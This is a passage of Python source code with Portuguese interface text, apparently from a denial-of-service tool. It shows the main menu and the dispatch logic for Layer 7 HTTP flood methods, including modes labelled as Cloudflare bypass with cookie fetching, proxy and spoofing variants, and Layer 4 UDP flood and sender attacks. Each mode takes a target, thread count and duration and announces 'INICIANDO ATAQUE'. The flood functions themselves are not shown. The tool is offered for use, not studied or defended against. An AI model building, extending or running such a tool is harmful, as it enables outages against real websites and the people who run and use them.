        if sys.platform == "win32":
            if not is_admin():
                print(f"\n{Fore.YELLOW}╔{'═'*50}╗")
                print(f"{Fore.YELLOW}║{'⚠️  AVISO DE PRIVILÉGIOS':^50}║")
                print(f"{Fore.YELLOW}╠{'═'*50}╣")
                print(f"{Fore.YELLOW}║{'':^50}║")
                print(f"{Fore.YELLOW}║{'Alguns métodos L4 precisam de':^50}║")
                print(f"{Fore.YELLOW}║{'privilégios de administrador!':^50}║")
                print(f"{Fore.YELLOW}║{'':^50}║")
                print(f"{Fore.YELLOW}║{'Recomendado executar como':^50}║")
                print(f"{Fore.YELLOW}║{'ADMINISTRADOR':^50}║")
                print(f"{Fore.YELLOW}║{'':^50}║")
                print(f"{Fore.YELLOW}╚{'═'*50}╝{Style.RESET_ALL}\n")
                time.sleep(3)
        
        show_banner()
        
        while True:
            print(f"\n{Fore.CYAN}╔{'═'*50}╗")
            print(f"{Fore.CYAN}║{Fore.WHITE}{'MENU PRINCIPAL':^50}{Fore.CYAN}║")
            print(f"{Fore.CYAN}╠{'═'*50}╣")
            print(f"{Fore.CYAN}║{Fore.WHITE}  [1] 🎯  Layer 7 (HTTP/HTTPS){Fore.CYAN}                    ║")
            print(f"{Fore.CYAN}║{Fore.WHITE}  [2] 🌐  Layer 4 (UDP/TCP){Fore.CYAN}                       ║")
            print(f"{Fore.CYAN}║{Fore.WHITE}  [3] 📥  Atualizar Proxies{Fore.CYAN}                       ║")
            print(f"{Fore.CYAN}║{Fore.WHITE}  [4] ❌  Sair{Fore.CYAN}                                    ║")
            print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}")
            
            print(f"\n{Fore.MAGENTA}[?]{Fore.WHITE} Escolha: ", end="")
            
            try:
                choice = input().strip()
                
                if choice == "1":
                    layer7_menu()
                elif choice == "2":
                    layer4_menu()
                elif choice == "3":
                    print(f"\n{Fore.YELLOW}[!] Atualizando proxies...{Style.RESET_ALL}")
                    get_proxylist("HTTP")
                    get_proxylist("SOCKS5")
                    print(f"{Fore.GREEN}[+] Proxies atualizados!{Style.RESET_ALL}")
                    time.sleep(2)
                elif choice == "4":
                    print(f"\n{Fore.GREEN}[+] Saindo... Até logo!{Style.RESET_ALL}")
                    sys.exit(0)
                else:
                    print(f"{Fore.RED}[!] Opção inválida{Style.RESET_ALL}")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}[!] Interrompido pelo usuário{Style.RESET_ALL}")
                sys.exit(0)
                
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Programa encerrado{Style.RESET_ALL}")
        sys.exit(0)

def layer7_menu():
    """Menu de métodos Layer 7 melhorado"""
    show_banner()
    print(f"\n{Fore.CYAN}╔{'═'*50}╗")
    print(f"{Fore.CYAN}║{Fore.WHITE}{'MÉTODOS LAYER 7':^50}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╠{'═'*50}╣")
    print(f"{Fore.CYAN}║{Fore.WHITE}  1. RAW GET      │   7. SPOOF{Fore.CYAN}                    ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  2. POST         │   8. CFB (Cloudflare){Fore.CYAN}         ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  3. HEAD         │   9. PXCFB (Proxy CF){Fore.CYAN}         ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  4. PXRAW        │  10. CFPRO (Cookie CF){Fore.CYAN}        ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  5. SOC          │  11. PXSOC{Fore.CYAN}                    ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  6. PPS          │  12. 🔙 VOLTAR{Fore.CYAN}                ║")
    print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.MAGENTA}[?]{Fore.WHITE} Escolha o método (1-12): ", end="")
    
    try:
        method = input().strip()
        
        if method == "12":
            main()
            return
        
        target, thread, t = get_info_l7()
        
        # Mapeamento de métodos
        methods = {
            "1": ("RAW GET", LaunchRAW),
            "2": ("POST", LaunchPOST),
            "3": ("HEAD", LaunchHEAD),
            "4": ("PXRAW", LaunchPXRAW),
            "5": ("SOC", LaunchSOC),
            "6": ("PPS", LaunchPPS),
            "7": ("SPOOF", LaunchSPOOF),
            "8": ("CFB", LaunchCFB),
            "9": ("PXCFB", LaunchPXCFB),
            "10": ("CFPRO", LaunchCFPRO),
            "11": ("PXSOC", LaunchPXSOC)
        }
        
        if method in methods:
            method_name, method_func = methods[method]
            
            print(f"\n{Fore.CYAN}╔{'═'*50}╗")
            print(f"{Fore.CYAN}║{Fore.WHITE}{'INICIANDO ATAQUE':^50}{Fore.CYAN}║")
            print(f"{Fore.CYAN}╠{'═'*50}╣")
            print(f"{Fore.CYAN}║ {Fore.WHITE}📌 Método: {Fore.GREEN}{method_name}{Fore.CYAN}                               ║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}🎯 Alvo: {Fore.YELLOW}{target[:40]}{Fore.CYAN}                                       ║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}⚡ Threads: {Fore.MAGENTA}{thread}{Fore.CYAN}                                    ║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}⏱️  Tempo: {Fore.BLUE}{t}s{Fore.CYAN}                                    ║")
            print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}\n")
            
            if method == "10":  # CFPRO precisa de cookie
                print(f"{Fore.YELLOW}[!] Obtendo cookie do Cloudflare...{Style.RESET_ALL}")
                if get_cookie(target):
                    print(f"{Fore.GREEN}[+] Cookie obtido!{Style.RESET_ALL}")
                    method_func(target, thread, t)
                else:
                    print(f"{Fore.RED}[!] Falha ao obter cookie, continuando sem...{Style.RESET_ALL}")
                    method_func(target, thread, t)
            else:
                method_func(target, thread, t)
            
            # Aguardar ataque terminar
            time.sleep(int(t) + 1)
            
            print(f"\n{Fore.GREEN}[+] Ataque finalizado!{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[!] Pressione Enter para continuar...{Style.RESET_ALL}", end="")
            input()
            
        else:
            print(f"{Fore.RED}[!] Método inválido{Style.RESET_ALL}")
            time.sleep(2)
            layer7_menu()
            
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Ataque interrompido{Style.RESET_ALL}")
        time.sleep(2)
        main()
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
        time.sleep(2)
        layer7_menu()

def layer4_menu():
    """Menu de métodos Layer 4 melhorado"""
    show_banner()
    print(f"\n{Fore.CYAN}╔{'═'*50}╗")
    print(f"{Fore.CYAN}║{Fore.WHITE}{'MÉTODOS LAYER 4':^50}{Fore.CYAN}║")
    print(f"{Fore.CYAN}╠{'═'*50}╣")
    print(f"{Fore.CYAN}║{Fore.WHITE}  1. 🌊 UDP Flood{Fore.CYAN}                                 ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  2. 📦 UDP Sender{Fore.CYAN}                                ║")
    print(f"{Fore.CYAN}║{Fore.WHITE}  3. 🔙 VOLTAR{Fore.CYAN}                                    ║")
    print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}")
    
    print(f"\n{Fore.MAGENTA}[?]{Fore.WHITE} Escolha o método (1-3): ", end="")
    
    try:
        method = input().strip()
        
        if method == "3":
            main()
            return
        
        if method in ["1", "2"]:
            target, port, thread, t = get_info_l4()
            
            print(f"\n{Fore.CYAN}╔{'═'*50}╗")
            print(f"{Fore.CYAN}║{Fore.WHITE}{'INICIANDO ATAQUE':^50}{Fore.CYAN}║")
            print(f"{Fore.CYAN}╠{'═'*50}╣")
            print(f"{Fore.CYAN}║ {Fore.WHITE}📌 Método: {Fore.GREEN}{'UDP Flood' if method=='1' else 'UDP Sender'}{Fore.CYAN}                             ║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}🎯 Alvo: {Fore.YELLOW}{target}:{port}{Fore.CYAN}                                     ║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}⚡ Threads: {Fore.MAGENTA}{thread}{Fore.CYAN}                                    ║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}⏱️  Tempo: {Fore.BLUE}{t}s{Fore.CYAN}                                    ║")
            print(f"{Fore.CYAN}╚{'═'*50}╝{Style.RESET_ALL}\n")
            
            if method == "1":
                runflooder(target, int(port), thread, t)
            elif method == "2":
                runsender(target, int(port), thread, t)
            
            # Aguardar ataque terminar
            time.sleep(int(t) + 1)
            
            print(f"\n{Fore.GREEN}[+] Ataque finalizado!{Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[!] Pressione Enter para continuar...{Style.RESET_ALL}", end="")
            input()
            
        else:
            print(f"{Fore.RED}[!] Método inválido{Style.RESET_ALL}")
            time.sleep(2)
            layer4_menu()
            
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Ataque interrompido{Style.RESET_ALL}")
        time.sleep(2)
        main()
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
        time.sleep(2)
        layer4_menu()

if __name__ == "__main__":
    try:
        # Configurar handler para Ctrl+C
        signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
        
        # Executar main
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Programa encerrado{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Erro fatal: {e}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Pressione Enter para sair...{Style.RESET_ALL}")
        input()
        sys.exit(1)